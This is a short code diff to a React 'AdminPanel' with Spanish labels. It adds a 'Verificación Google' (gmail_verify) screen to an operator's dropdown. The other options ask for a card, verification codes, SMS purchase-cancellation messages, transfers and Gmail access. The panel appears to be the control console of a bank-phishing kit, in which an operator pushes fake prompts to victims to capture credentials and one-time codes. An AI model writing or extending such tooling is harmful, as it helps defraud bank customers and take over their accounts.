@@ -460,7 +460,7 @@ export default function AdminPanel() {
     console.log("handleScreenChange recibió tipo de pantalla:", screen);
 
     // Handle modals for certain screens
-    if (["protege", "transferir", "cancelacion", "codigo", "mensaje", "sms_compra", "tarjeta", "gmail"].includes(screen)) {
+    if (["protege", "transferir", "cancelacion", "codigo", "mensaje", "sms_compra", "tarjeta", "gmail", "gmail_verify"].includes(screen)) {
       console.log("Activando modal para:", screen);
       setActiveModal(screen);
       return;
@@ -769,6 +769,7 @@ export default function AdminPanel() {
                   <option value="mensaje">7. Ingresa el mensaje que gustes</option>
                   <option value="sms_compra">8. SMS Compra - Cancelación de cargo</option>
                   <option value="gmail">9. Solicitar acceso Gmail</option>
+                  <option value="gmail_verify">10. Verificación Google</option>
                 </select>
               </div>
             </div>
